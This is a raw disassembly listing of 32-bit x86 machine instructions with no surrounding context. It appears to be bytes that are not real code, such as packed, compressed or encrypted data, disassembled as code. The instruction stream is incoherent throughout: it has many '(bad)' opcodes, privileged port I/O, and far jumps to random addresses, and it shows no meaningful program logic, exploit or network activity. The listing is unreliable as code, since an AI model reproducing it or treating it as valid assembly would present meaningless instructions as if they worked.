  4038f9:	imul   esi,DWORD PTR [ebx],0xcac750e8
  4038ff:	inc    DWORD PTR [edi+0x79]
  403902:	retf   0x1475
  403905:	jo     0xcb195bfa
  40390b:	push   eax
  40390c:	add    al,0x61
  40390e:	sar    edi,1
  403910:	adc    edx,DWORD PTR [edx-0x35]
  403913:	jne    0x40391d
  403915:	push   edx
  403916:	fsub   QWORD PTR ds:0xca665af7
  40391c:	daa    
  40391d:	fwait
  40391e:	aad    0x36
  403920:	repz in eax,0x54
  403923:	fist   DWORD PTR [edx-0x6a35b17f]
  403929:	adc    eax,0x73598641
  40392e:	jmp    0xad1e9782
  403933:	iret   
  403934:	ins    BYTE PTR es:[edi],dx
  403935:	jo     0x4038eb
  403937:	mov    DWORD PTR [eax],0x0
	...
  403961:	mov    ah,0xb9
  403963:	inc    esp
  403964:	add    ebx,DWORD PTR [esi+edx*8]
  403967:	sub    DWORD PTR [ebx-0x12],ecx
  40396a:	outs   dx,DWORD PTR ds:[esi]
  40396b:	pushf  
  40396c:	iret   
  40396d:	mov    ah,0xe5
  40396f:	sub    al,0x3
  403971:	sbb    al,0x64
  403973:	sub    DWORD PTR [edi+0x42],ecx
  403976:	or     edi,esi
  403978:	dec    edi
  403979:	xchg   esp,eax
  40397a:	or     BYTE PTR [edx-0x2c],0x8b
  40397e:	outs   dx,DWORD PTR ds:[esi]
  40397f:	bound  ebp,QWORD PTR [ebx-0x33a3901c]
  403985:	iret   
  403986:	or     dl,cl
  403988:	mov    bh,0x6d
  40398a:	outs   dx,DWORD PTR ds:[esi]
  40398b:	(bad)  
  40398c:	leave  
  40398d:	icebp  
  40398e:	shr    WORD PTR [ebx],0x40
  403992:	pop    edx
  403993:	jmp    0xbe9f1b14
  403998:	dec    edi
  403999:	push   esp
  40399a:	fucomip st,st(1)
  40399c:	(bad)  [esi+0x43c9ae69]
  4039a2:	in     eax,0xa4
  4039a4:	fdivr  QWORD PTR ds:0xa7c99e82
  4039aa:	fwait
  4039ab:	xor    bh,BYTE PTR [ebx+0x2ee9625e]
  4039b1:	xchg   edi,eax
  4039b2:	jle    0x4039d2
  4039b4:	jge    0x40394f
  4039b6:	arpl   WORD PTR [edx+0x826af3],dx
  4039bc:	out    dx,eax
  4039bd:	mov    DWORD PTR [esi],edx
  4039bf:	add    DWORD PTR [ecx+0x1d],esp
  4039c2:	push   ss
  4039c3:	and    BYTE PTR [esi],0x0
	...
  4039ee:	and    al,ch
  4039f0:	hlt    
  4039f1:	mov    esi,0x16801634
  4039f6:	inc    eax
  4039f7:	out    0xe9,eax
  4039f9:	imul   edx,DWORD PTR ds:0xa04c7460,0xbfb50a2e
  403a03:	fstp   TBYTE PTR [edi]
  403a05:	loopne 0x403a62
  403a07:	xchg   edx,eax
  403a08:	mov    ebp,DWORD PTR [edi+eax*8-0x280e8a93]
  403a0f:	jae    0x4039ec
  403a11:	jmp    0xea391435
  403a16:	dec    ebp
  403a17:	or     BYTE PTR ss:[ebp+0x7d206e17],0x8a
  403a1f:	out    dx,al
  403a20:	jnp    0x4039e3
  403a22:	fs pusha 
  403a24:	je     0x403a0d
  403a26:	lahf   
  403a27:	out    dx,eax
  403a28:	aaa    
  403a29:	out    dx,al
  403a2a:	sub    edx,0x32e36906
  403a30:	push   eax
  403a32:	loop   0x403a89
  403a34:	(bad)  
  403a35:	sub    eax,0xc2006e18
  403a3a:	sbb    DWORD PTR [edx+0xe93d202],eax
  403a40:	leave  
  403a41:	stos   DWORD PTR es:[edi],eax
  403a42:	push   ebx
  403a43:	outs   dx,BYTE PTR ds:[esi]
  403a44:	push   esp
  403a45:	bound  esi,QWORD PTR [ebx-0x26]
  403a48:	(bad)  
  403a49:	lds    ecx,FWORD PTR [eax]
  403a4b:	fidivr DWORD PTR ds:0x1bf85a
  403a51:	jmp    0x403a56
	...
  403a7a:	add    bl,ah
  403a7c:	dec    eax
  403a7d:	adc    esp,0xffffff8c
  403a80:	and    al,BYTE PTR [ecx-0x17]
  403a83:	pop    ds
  403a84:	out    0x8,eax
  403a86:	add    BYTE PTR [esi+0x444b9f55],al
  403a8c:	push   edi
  403a8d:	add    BYTE PTR [ebp-0x6],dh
  403a90:	dec    esi
  403a91:	rcr    BYTE PTR [ebx-0x44],0x97
  403a95:	or     BYTE PTR [eax],al
  403a97:	push   cs
  403a98:	rol    bh,0x45
  403a9b:	dec    ecx
  403a9c:	pop    edx
  403a9d:	add    BYTE PTR [eax],al
  403a9f:	cmc    
  403aa0:	in     al,0x44
  403aa2:	clc    
  403aa3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403aa4:	mov    ds:0x59ef0875,al
  403aa9:	call   DWORD PTR ds:0x412f56
  403aaf:	mov    esi,0x5d5b7499
  403ab4:	xchg   ecx,eax
  403ab5:	fild   DWORD PTR [eax]
  403ab7:	(bad)
  403aba:	lea    edi,[eax-0x63]
  403abd:	push   eax
  403abe:	push   0xffffffd5
  403ac0:	daa    
  403ac1:	call   DWORD PTR ds:0x412f32
  403ac7:	mov    ds,WORD PTR [ecx+0x2d3a2974]
  403acd:	in     al,0x1
  403acf:	jne    0x403b2a
  403ad1:	add    bh,bh
  403ad3:	or     BYTE PTR [edx-0x6ab2ba71],ah
  403ad9:	jne    0x403ad7
  403adb:	add    bl,BYTE PTR [esp+ebp*8]
  403ade:	add    DWORD PTR [eax],0x0
	...
  403b05:	add    BYTE PTR [eax],al
  403b07:	add    al,dl
  403b09:	jb     0x403b0a
  403b0b:	jae    0x403b89
  403b0d:	lods   al,BYTE PTR ds:[esi]
  403b0e:	inc    ebp
  403b0f:	lock inc edi
  403b11:	pop    ecx
  403b12:	add    BYTE PTR [eax],al
  403b14:	outs   dx,BYTE PTR ds:[esi]
  403b15:	ins    DWORD PTR es:[edi],dx
  403b16:	mov    BYTE PTR [ebp-0x7b],0x56
  403b1a:	add    BYTE PTR [eax],al
  403b1c:	xor    eax,0x456a0013
  403b21:	adc    edx,DWORD PTR [eax]
  403b23:	(bad)  
  403b24:	clc    
  403b25:	jp     0x403b77
  403b27:	push   0x1c
  403b29:	test   dh,al
  403b2b:	jne    0x403b55
  403b2d:	fdivr  st(1),st
  403b2f:	mov    dh,0x67
  403b31:	inc    ebx
  403b32:	add    al,0xb
  403b34:	fsub   QWORD PTR [esi+0x4]
  403b37:	inc    ebx
  403b38:	lahf   
  403b39:	addr16 iret 
  403b3b:	add    BYTE PTR [eax-0xf8a3986],cl
  403b41:	or     bh,cl
  403b43:	ficomp DWORD PTR [edx+eax*4]
  403b46:	jp     0x403b0b
  403b48:	inc    edi
  403b49:	cmp    eax,edx
  403b4b:	or     BYTE PTR [edi+eiz*4],bl
  403b4e:	jp     0x403b3c
  403b50:	fld    TBYTE PTR [edi+0x391be7fb]
  403b56:	add    al,0x0
  403b58:	pop    esp
  403b59:	rcr    bl,cl
  403b5b:	inc    ecx
  403b5c:	int3   
  403b5d:	cmp    eax,0xcfbb50c7
  403b62:	sti    
  403b63:	dec    edi
  403b64:	les    esp,FWORD PTR [esi-0x56]
  403b67:	add    BYTE PTR [edx+ebp*4],bl
  403b6a:	mov    esp,0xc2
	...
  403b93:	add    BYTE PTR [eax],al
  403b95:	sbb    BYTE PTR [edx+0x1888b30],al
  403b9b:	sar    ah,0xef
  403b9e:	add    BYTE PTR [ecx+0x8],cl
  403ba1:	sbb    al,0xef
  403ba3:	std    
  403ba4:	sub    bl,BYTE PTR [ecx+ecx*8-0x44]
  403ba8:	ret    0x8224
  403bab:	sbb    bl,bl
  403bad:	push   es
  403bae:	sbb    BYTE PTR [ecx+0x0],0xf6
  403bb2:	sbb    DWORD PTR [ecx+0x0],0xfef80763
  403bb9:	shr    DWORD PTR [ecx+0x59],1
  403bbc:	add    dh,al
  403bbe:	sbb    ebx,0x3826736
  403bc4:	or     ebx,DWORD PTR [esi+eiz*1+0x10]
  403bc8:	mov    ecx,esp
  403bca:	pop    edx
  403bcb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403bcc:	(bad)  
  403bcd:	test   eax,0x3bcd916e
  403bd2:	ins    BYTE PTR es:[edi],dx
  403bd3:	xchg   esi,eax
  403bd4:	cli    
  403bd5:	arpl   di,sp
  403bd7:	ret    
  403bd8:	jp     0x403bce
  403bda:	add    cl,ch
  403bdc:	pop    ecx
  403bdd:	sbb    al,0x6c
  403bdf:	hlt    
  403be0:	(bad)  
  403be1:	outs   dx,DWORD PTR ds:[esi]
  403be2:	ins    BYTE PTR es:[edi],dx
  403be3:	cld    
  403be4:	test   DWORD PTR [edx],0x1c59e0e6
  403bea:	add    ecx,ebp
  403bec:	(bad)  [esi]
  403bee:	nop
  403bef:	jmp    0xdcdb52f7
  403bf4:	sti    
  403bf5:	dec    esi
  403bf6:	adc    DWORD PTR [ecx+0xd6],0x0
	...
  403c21:	add    bl,bl
  403c23:	imul   edx,DWORD PTR [edx],0xffffffab
  403c26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c27:	xchg   edi,eax
  403c28:	mov    ds:0xe962debc,al
  403c2d:	xor    BYTE PTR [edi-0x44393c82],dl
  403c33:	in     eax,0xf0
  403c35:	fistp  DWORD PTR [ebx-0x2a39e195]
  403c3b:	cwde   
  403c3c:	in     eax,dx
  403c3d:	add    ecx,DWORD PTR [ecx-0x20]
  403c40:	std    
  403c41:	sbb    DWORD PTR [ecx],0x1a4fe95f
  403c47:	fdivr  DWORD PTR [ebx+edi*8-0x75]
  403c4b:	out    0xee,al
  403c4d:	sbb    bl,BYTE PTR [ecx+eiz*4+0x2b]
  403c51:	sti    
  403c52:	jnp    0x403c55
  403c54:	jmp    0xde9f261d
  403c59:	dec    edi
  403c5a:	adc    al,0x83
  403c5c:	scas   eax,DWORD PTR es:[edi]
  403c5d:	test   eax,0xc3e25b1c
  403c62:	ror    BYTE PTR [edx-0x68],1
  403c65:	push   edi
  403c66:	and    BYTE PTR [esp+esi*1-0x8],ch
  403c6a:	dec    edx
  403c6b:	in     eax,0xff
  403c6d:	loopne 0x403cd6
  403c6f:	sbb    edi,edi
  403c71:	scas   al,BYTE PTR es:[edi]
  403c72:	popa   
  403c73:	jg     0x403c8d
  403c75:	jb     0x403c6a
  403c77:	pop    esi
  403c78:	inc    eax
  403c79:	cmp    DWORD PTR [eax-0x1b],ecx
  403c7c:	out    dx,al
  403c7d:	xchg   esi,eax
  403c7e:	pop    ecx
  403c7f:	or     bh,bh
  403c81:	adc    al,0x14
  403c83:	sbb    edi,edi
  403c85:	cld    
	...
  403cae:	add    BYTE PTR [edi],dl
  403cb0:	sbb    DWORD PTR [edi+0x586ae18e],0xffffffa0
  403cb7:	ficom  WORD PTR [ebx+0x0]
  403cba:	adc    al,0x75
  403cbc:	ja     0x403d14
  403cbe:	mov    esi,0xf17dde2c
  403cc3:	pop    ds
  403cc4:	lock or BYTE PTR [edx],al
  403cc7:	fadd   DWORD PTR [esi]
  403cc9:	pop    edi
  403cca:	scas   eax,DWORD PTR es:[edi]
  403ccb:	xchg   esi,eax
  403ccc:	popf   
  403ccd:	or     cl,ch
  403ccf:	push   esp
  403cd0:	and    BYTE PTR [edx+ebp*2],cl
  403cd3:	rcr    BYTE PTR [ebx+ecx*1+0x29],0x6c
  403cd8:	push   esp
  403cd9:	sub    ebp,DWORD PTR [ecx]
  403cdb:	add    eax,0xde305e0a
  403ce0:	push   ebx
  403ce1:	add    BYTE PTR [edx+0x3],dh
  403ce4:	push   edi
  403ce5:	mov    ebx,DWORD PTR [edi+eiz*4-0x1afd012b]
  403cec:	add    BYTE PTR [ebx+0x30679fef],cl
  403cf2:	jnp    0x403c79
  403cf4:	jmp    0xfd80:0x5fd0b0fb
  403cfb:	pcmpeqd mm5,QWORD PTR ds:0x721c5b69
  403d02:	in     al,dx
  403d03:	lahf   
  403d04:	addr16 inc esi
  403d06:	pop    esi
  403d07:	pusha  
  403d08:	jmp    0xa:0x9fa028eb
  403d0f:	outs   dx,BYTE PTR ds:[esi]
  403d10:	jae    0x403d91
  403d12:	cld    
	...
  403d3b:	add    ah,dl
  403d3d:	or     al,0xd
  403d3f:	or     BYTE PTR [ecx-0x3af788f8],0x91
  403d46:	popa   
  403d47:	add    BYTE PTR [ecx+0x4e09ea64],0x9e
  403d4e:	pop    ebx
  403d4f:	pop    edi
  403d50:	jmp    0x403cf7
  403d52:	ret    0x508
  403d55:	bound  esi,QWORD PTR [eax]
  403d57:	jb     0x403d66
  403d59:	bound  edi,QWORD PTR [ecx]
  403d5b:	ja     0x403d5e
  403d5d:	push   edx
  403d5e:	xor    bl,ch
  403d60:	shl    BYTE PTR [ecx+0x41],1
  403d63:	jb     0x403d64
  403d65:	popa   
  403d66:	inc    esi
  403d67:	ja     0x403d6c
  403d69:	push   edx
  403d6a:	inc    ecx
  403d6b:	add    al,0xef
  403d6d:	adc    BYTE PTR [edi],0x3c
  403d70:	aam    0xb
  403d72:	or     bh,BYTE PTR [ebx+eiz*8]
  403d75:	push   ss
  403d76:	push   es
  403d77:	sub    al,0xe4
  403d79:	imul   ecx,DWORD PTR [ecx],0xc042cceb
  403d7f:	pop    ebx
  403d80:	stos   BYTE PTR es:[edi],al
  403d81:	aas    
  403d82:	leave  
  403d83:	ret    0x5dbd
  403d86:	shl    al,0xc1
  403d89:	arpl   bx,ax
  403d8b:	stos   BYTE PTR es:[edi],al
  403d8c:	outs   dx,BYTE PTR ds:[esi]
  403d8d:	and    al,BYTE PTR [ebx-0x259d483a]
  403d93:	jne    0x403d99
  403d95:	(bad)  
  403d96:	add    DWORD PTR [eax],eax
  403d98:	test   DWORD PTR [ebp+0x5b],ebx
  403d9b:	pop    edi
  403d9c:	stos   DWORD PTR es:[edi],eax
  403d9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d9e:	ret    0x8
	...
  403dc9:	jne    0x403e01
  403dcb:	push   ebx
  403dcc:	push   eax
  403dcd:	lea    eax,ds:0x5f452a1f
  403dd3:	clc    
  403dd4:	jb     0x403e4a
  403dd6:	mov    al,ds:0x731cbbff
  403ddb:	add    eax,DWORD PTR [eax]
  403ddd:	sbb    al,0xd9
  403ddf:	fs dec ebp
  403de1:	fnsave [ebx+0x2d]
  403de4:	add    ebx,esi
  403de6:	mov    eax,DWORD PTR [edx-0x3]
  403de9:	inc    ebx
  403dea:	mov    al,0xe7
  403dec:	xlat   BYTE PTR ds:[ebx]
  403ded:	cmp    BYTE PTR [ebx+eax*8-0x47],ah
  403df1:	xor    eax,eax
  403df3:	ret    
  403df4:	jmp    FWORD PTR [esi]
  403df6:	sbb    esp,edi
  403df8:	push   es
  403df9:	test   eax,0x77c38fdb
  403dfe:	cmp    edi,eax
  403e00:	push   ebp
  403e01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403e02:	into   
  403e03:	xchg   esp,eax
  403e05:	or     al,0x46
  403e07:	push   esp
  403e08:	pop    eax
  403e09:	je     0x403e56
  403e0b:	out    dx,al
  403e0c:	aas    
  403e0d:	sbb    al,0xea
  403e0f:	xor    eax,0x8701df01
  403e14:	cmp    eax,0x44ad8b
  403e19:	sbb    al,0x86
  403e1b:	adc    eax,0x4fe11983
  403e20:	inc    ecx
  403e21:	sbb    al,0x72
  403e23:	aaa    
  403e24:	or     DWORD PTR [edi+0x5d4b6e67],ebx
  403e2a:	jb     0x403e2f
  403e2c:	jne    0x403e2e
	...
  403e56:	and    DWORD PTR [ebp-0x3c],ebx
  403e59:	pop    ebx
  403e5a:	in     eax,0x35
  403e5c:	out    dx,eax
  403e5d:	fidiv  DWORD PTR [esp+edx*8-0xe3ff24]
  403e64:	pop    eax
  403e65:	cld    
  403e66:	out    dx,al
  403e67:	fisttp DWORD PTR [ebx]
  403e69:	push   eax
  403e6a:	xchg   ebx,eax
  403e6b:	xchg   DWORD PTR [edx+0xe71dd4b],esp
  403e71:	rcl    BYTE PTR [ebx],0xf6
  403e74:	xchg   ebx,eax
  403e75:	add    BYTE PTR [edx+esi*2],bl
  403e78:	retf   0x7445
  403e7b:	pop    ebx
  403e7c:	jmp    0x6c9b5a84
  403e81:	dec    eax
  403e82:	or     eax,DWORD PTR fs:[ebx+0x4]
  403e86:	(bad)  
  403e87:	pop    edx
  403e88:	inc    ebx
  403e89:	add    eax,0xc2c4ee53
  403e8e:	xor    eax,eax
  403e90:	xor    al,BYTE PTR [ebp+0x1c]
  403e93:	push   esp
  403e94:	test   eax,0xf772c638
  403e99:	fcomp  QWORD PTR [ebx+ebx*2]
  403e9c:	push   0xffffffbb
  403e9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e9f:	in     eax,dx
  403ea0:	or     BYTE PTR [edi+0x37e962a1],al
  403ea6:	jbe    0x403f10
  403ea8:	adc    al,0xbc
  403eaa:	add    al,0x77
  403eac:	xchg   esp,eax
  403ead:	ret    0xd20b
  403eb0:	and    al,0xb8
  403eb2:	xchg   ecx,eax
  403eb3:	sbb    eax,0xedfb5371
  403eb8:	jo     0x403e7c
	...
  403ee2:	add    BYTE PTR [ecx+0x6f],ch
  403ee5:	rol    DWORD PTR [ebx+ebp*8],cl
  403ee8:	in     eax,dx
  403ee9:	pop    esp
  403eea:	ret    0xc009
  403eed:	mov    ds:0x29541c44,al
  403ef2:	aaa    
  403ef3:	add    dl,ah
  403ef5:	lods   al,BYTE PTR ds:[esi]
  403ef6:	mov    bh,0x97
  403ef8:	dec    edx
  403ef9:	ins    BYTE PTR es:[edi],dx
  403efa:	dec    eax
  403efb:	int3   
  403efc:	or     bl,BYTE PTR [ebx-0x5d4bee3e]
  403f02:	inc    esp
  403f03:	sbb    al,0x54
  403f05:	sub    DWORD PTR [edi],esi
  403f07:	push   es
  403f08:	repz jns 0x403f5b
  403f0b:	pop    ebp
  403f0c:	pop    ebx
  403f0d:	push   ss
  403f0e:	cmp    BYTE PTR [edx+esi*2+0x5b1cdafd],cl
  403f15:	bnd ret 
  403f17:	adc    DWORD PTR [edx-0x56],ebx
  403f1a:	ret    0x6b09
  403f1d:	add    BYTE PTR [ecx],al
  403f1f:	xor    al,BYTE PTR [ebx-0x12a11700]
  403f25:	repz shl DWORD PTR [ecx+0x5ddeff75],1
  403f2c:	in     eax,dx
  403f2d:	sti    
  403f2e:	shl    ebx,0x82
  403f31:	add    cl,ch
  403f33:	mov    al,ds:0x61b05b9b
  403f38:	or     eax,0x9e9fcd8b
  403f3d:	shl    BYTE PTR [edi+0x1953675d],0xd0
  403f44:	repnz aas 
  403f46:	rol    BYTE PTR [eax],cl
	...
  403f70:	fistp  WORD PTR [edx-0x8]
  403f73:	sbb    ebx,DWORD PTR [edi]
  403f75:	pushf  
  403f76:	jmp    FWORD PTR [edx+0x1b]
  403f79:	cli    
  403f7a:	dec    edx
  403f7b:	sub    BYTE PTR [eax],bl
  403f7d:	pop    ebx
  403f7e:	je     0x403f62
  403f80:	mov    al,ds:0x5f326728
  403f85:	pop    ebx
  403f86:	add    ch,bh
  403f88:	adc    edx,ebx
  403f8a:	cmp    eax,0x1c614e
  403f8f:	jmp    0x1cc393c7
  403f94:	jns    0x403fa8
  403f96:	inc    ecx
  403f97:	jmp    0x2452fbb
  403f9c:	fadd   DWORD PTR [edx]
  403f9e:	leave  
  403f9f:	sub    bh,BYTE PTR [ecx-0x72b007f]
  403fa5:	adc    DWORD PTR [ecx-0x17],eax
  403fa8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403fa9:	and    ah,dh
  403fab:	es fwait
  403fad:	xchg   edi,eax
  403fae:	(bad)  
  403faf:	fnsave es:[ebx]
  403fb2:	add    ecx,ebp
  403fb4:	pop    ds
  403fb5:	icebp  
  403fb6:	inc    DWORD PTR [edx+0x31737321]
  403fbc:	sbb    BYTE PTR [ebx-0x7d],bl
  403fbf:	add    BYTE PTR ds:0x63840f9c,bl
  403fc5:	pop    ecx
  403fc6:	add    BYTE PTR [eax],al
  403fc8:	cld    
  403fc9:	(bad)  
  403fcb:	inc    BYTE PTR [edx-0x4e7a7265]
  403fd1:	pushf  
  403fd2:	(bad)  
  403fd3:	inc    DWORD PTR [eax]
	...
  403ffd:	and    eax,0x73c8b59c
  404002:	fwait
  404003:	(bad)  
  404004:	call   0x40c716
  404009:	dec    esi
  40400a:	call   0x0:0x5a86840f
  404011:	fst    st(0)
  404013:	dec    ebp
  404014:	inc    ecx
  404015:	inc    ebp
  404016:	aad    0x85
  404018:	lock sbb DWORD PTR [ebx+0xf8d50ff],0xffffffd9
  404020:	add    BYTE PTR ds:0x790fc057,al
  404026:	lahf   
  404027:	add    BYTE PTR [eax],al
  404029:	cmc    
  40402a:	xchg   edx,eax
  40402b:	test   esp,eax
  40402d:	sbb    DWORD PTR [ebx+0x5a0500ff],0x0
  404034:	lea    edi,[eax-0x62]
  404037:	(bad)  
  404038:	inc    DWORD PTR [edx+0x29b5ff0a]
  40403e:	pushf  
  40403f:	(bad)  
  404040:	push   DWORD PTR [edx+0x4d]
  404043:	addr16 dec ebx
  404045:	test   BYTE PTR [ecx-0x75],bl
  404048:	xchg   ebp,eax
  404049:	stc    
  40404a:	fwait
  40404b:	(bad)  
  40404c:	dec    esi
  40404e:	cdq    
  40404f:	je     0x409aa2
  404055:	scas   al,BYTE PTR es:[edi]
  404056:	or     al,0xf4
  404058:	sha256rnds2 xmm0,XMMWORD PTR [eax],xmm0
  40405c:	add    BYTE PTR [ebp+0xd4b59a],dh
	...
  40408a:	sbb    al,0x4e
  40408c:	sar    bh,0x6
  40408f:	je     0x4040bc
  404091:	add    BYTE PTR [esp+esi*2],bl
  404094:	add    eax,0x34c8be8
  404099:	add    BYTE PTR [edi],ah
  40409b:	xor    al,0x37
  40409d:	jns    0x404044
  40409f:	mov    esi,0x7fe18dbb
  4040a4:	push   esp
  4040a5:	push   0x17277
  4040aa:	pop    ebx
  4040ab:	push   es
  4040ac:	mov    esp,0x4af529ff
  4040b1:	inc    ecx
  4040b2:	sbb    al,0x69
  4040b4:	ret    
  4040b5:	je     0x40409b
  4040b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4040b8:	cmp    esp,edi
  4040ba:	cmp    eax,DWORD PTR [esi+0x73dd4b62]
  4040c0:	or     al,al
  4040c2:	mov    al,0x7a
  4040c4:	inc    edx
  4040c5:	(bad)  
  4040c6:	cdq    
  4040c7:	mov    bl,0xbe
  4040c9:	call   FWORD PTR [ebx]
  4040cb:	jae    0x4040d0
  4040cd:	add    BYTE PTR [edi+eax*1],bl
  4040d0:	mov    eax,eax
  4040d2:	or     bl,dh
  4040d4:	mov    edi,0x3a57450
  4040d9:	nop    edx
  4040dc:	fcomp  DWORD PTR [edx+esi*2]
  4040e0:	or     al,al
  4040e2:	jno    0x40414b
  4040e4:	cmp    BYTE PTR [ebp-0x40fb24],0x1c
  4040eb:	xchg   BYTE PTR [edi],cl
  4040ed:	inc    DWORD PTR [eax]
	...
  404117:	mov    DWORD PTR [edx],esi
  404119:	mov    esi,0x8edcbff
  40411e:	loope  0x404174
  404120:	mov    bl,0x3
  404122:	jmp    0x404113
  404124:	sbb    BYTE PTR [edx],bl
  404126:	jmp    FWORD PTR [ecx]
  404128:	lods   al,BYTE PTR ss:[esi]
  40412a:	lock rcr BYTE PTR [ebx-0x17],cl
  40412e:	add    esp,DWORD PTR [ebx-0x7b53df12]
  404134:	(bad)  
  404135:	jmp    0xe93c83d
  40413a:	cmp    DWORD PTR [ebx+esi*2+0x5b1cd627],eax
  404141:	ins    BYTE PTR es:[edi],dx
  404142:	mov    DWORD PTR [eax+0x65],ebp
  404145:	idiv   BYTE PTR [esi-0x33cb9c34]
  40414b:	push   0x64
  40414d:	out    0xab,al
  40414f:	repnz mov ebp,ecx
  404152:	add    eax,DWORD PTR [ebp+0x5e]
  404155:	(bad)  
  404156:	mov    esi,0xcb946453
  40415b:	dec    edx
  40415c:	fs (bad) 
  40415e:	stos   DWORD PTR es:[edi],eax
  40415f:	or     BYTE PTR [ebp-0x6758fc17],0x12
  404166:	int    0x5f
  404168:	push   cs
  404169:	bound  ebp,QWORD PTR [edi+0x53959f9f]
  40416f:	iret   
  404170:	or     DWORD PTR [ebx],edi
  404172:	push   edi
  404173:	jb     0x404145
  404175:	sub    al,0x10
  404177:	mov    eax,ds:0x369d2
	...
  4041a4:	sbb    al,0x5b
  4041a6:	je     0x4041bf
  4041a8:	fstp   DWORD PTR [edx-0x17]
  4041ab:	add    ebx,DWORD PTR [eax+edx*8]
  4041ae:	xchg   ecx,eax
  4041af:	mov    ah,ah
  4041b1:	cdq    
  4041b2:	add    DWORD PTR ds:0x8a551d95,0xbcea5361
  4041bc:	loop   0x404219
  4041be:	imul   eax,DWORD PTR [edx-0x44fddc41],0x32015f9f
  4041c8:	adc    bl,BYTE PTR [eax+0x42]
  4041cb:	jnp    0x404229
  4041cd:	pop    ebx
  4041ce:	add    cl,ch
  4041d0:	pop    ds
  4041d1:	xor    bl,al
  4041d3:	jmp    0xb90:0x15456367
  4041da:	cmp    BYTE PTR [esp+edx*2+0x6b],ch
  4041de:	(bad)  
  4041df:	out    dx,eax
  4041e0:	sbb    BYTE PTR [eax],bh
  4041e2:	inc    ebp
  4041e3:	xchg   BYTE PTR [edx+0x1c],ah
  4041e6:	add    al,0x70
  4041e8:	not    BYTE PTR [ebp+0x52e126ef]
  4041ee:	(bad)  
  4041ef:	adc    eax,0xa7c7c2f5
  4041f4:	sbb    ebp,ebp
  4041f6:	push   ebx
  4041f7:	sbb    ecx,DWORD PTR [eax]
  4041f9:	fs jne 0x4041c9
  4041fc:	cdq    
  4041fd:	in     eax,dx
  4041fe:	pop    es
  4041ff:	fld    TBYTE PTR fs:[edx+0x50]
  404203:	shl    DWORD PTR [ebx],0x5b
  404206:	add    cl,ch
	...
  404230:	add    BYTE PTR [ebx+0x1fe904a1],al
  404236:	pop    ebx
  404237:	mov    esi,DWORD PTR [eax+ecx*1]
  40423a:	push   0xc90fa5
  40423f:	pop    ecx
  404240:	inc    edx
  404241:	rcl    BYTE PTR [ecx+0x81fedc2],0x8b
  404248:	test   DWORD PTR [ebp+0x7137fc97],ebx
  40424e:	or     edx,DWORD PTR [ebx+0x18]
  404251:	outs   dx,BYTE PTR ds:[esi]
  404252:	(bad)  
  404253:	jne    0x404242
  404255:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404256:	loopne 0x40425f
  404258:	bound  ebx,QWORD PTR [ebx+0x4b]
  40425b:	mov    DWORD PTR [esp+ebx*8],esp
  40425e:	(bad)  
  40425f:	pop    es
  404260:	jb     0x4042a3
  404262:	push   edi
  404263:	mov    ebp,DWORD PTR [esi-0x1aa829d9]
  404269:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40426a:	xor    edx,DWORD PTR fs:[ebx-0x43]
  40426e:	xor    eax,DWORD PTR gs:[eax]
  404271:	pop    edi
  404272:	rol    BYTE PTR [edi+eax*1-0x28960523],cl
  404279:	(bad)  
  40427a:	pop    eax
  40427b:	rol    eax,0xc2
  40427e:	pop    ebx
  40427f:	ret    
  404280:	mov    edi,esi
  404282:	imul   edi,eax,0x23
  404285:	cmp    eax,0x118df86c
  40428a:	dec    eax
  40428b:	push   esi
  40428c:	mov    bh,0x42
  40428e:	scas   eax,DWORD PTR es:[edi]
  40428f:	add    edx,DWORD PTR [esi+0x71]
  404292:	popf   
  404293:	ret    0xc
	...
  4042be:	xchg   BYTE PTR [esi-0x5c490775],cl
  4042c4:	and    edi,edx
  4042c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4042c7:	mov    ds:0x836a8c8d,eax
  4042cc:	jo     0x4042ee
  4042ce:	and    DWORD PTR [esi+ecx*2+0x8],ebx
  4042d2:	test   BYTE PTR [ebp-0x2c80fcef],bl
  4042d8:	cli    
  4042d9:	xor    ebx,DWORD PTR [ebp+0x7b]
  4042dc:	clc    
  4042dd:	xor    ebx,DWORD PTR [ebp-0x2f]
  4042e0:	pushf  
  4042e1:	pop    ds
  4042e2:	pop    ebx
  4042e3:	nop
  4042e4:	mov    ebp,0xc0036c1
  4042e9:	shl    DWORD PTR [esi+0x48],0x3
  4042ed:	(bad)  [esi-0x1905cc5b]
  4042f3:	mov    ds:0xda68fa33,al
  4042f8:	pop    es
  4042f9:	scas   eax,DWORD PTR es:[edi]
  4042fa:	or     ah,BYTE PTR [edx]
  4042fc:	cmc    
  4042fd:	add    eax,DWORD PTR [ebx+0x47]
  404300:	rol    eax,0x2
  404303:	pop    ebx
  404304:	ret    
  404305:	mov    ebp,DWORD PTR [esi+0x6b]
  404308:	clc    
  404309:	and    edi,DWORD PTR [ebp+0x6b]
  40430c:	clc    
  40430d:	lea    edx,[ecx+0x47]
  404310:	sub    al,dh
  404312:	sbb    al,0xf1
  404314:	inc    ebx
  404315:	add    esi,DWORD PTR [edx+0x68]
  404318:	ret    0x10c2
  40431b:	jne    0x4042f0
  40431d:	mov    esi,DWORD PTR [esp+eiz*2+0x23b8]
	...
  404348:	add    BYTE PTR [eax],al
  40434a:	add    BYTE PTR [esi-0x6772479c],dh
  404350:	adc    BYTE PTR [eax],0x46
  404353:	in     al,dx
  404354:	or     eax,DWORD PTR [eax]
  404356:	dec    esi
  404357:	xor    al,0x33
  404359:	ret    0x1f11
  40435c:	ds mov dl,bh
  40435f:	dec    edi
  404360:	dec    esp
  404361:	loopne 0x40435b
  404363:	dec    edi
  404364:	pop    esp
  404365:	mov    ds,WORD PTR [ebx+ebx*1+0x71469673]
  40436c:	je     0x4043cb
  40436e:	sbb    al,0x5d
  404370:	xor    al,0x15
  404372:	add    eax,DWORD PTR [ebp-0x14]
  404375:	mov    esp,0xbf545633
  40437a:	xor    edx,DWORD PTR [esi-0xa]
  40437d:	jg     0x404386
  40437f:	fs jmp 0x404305
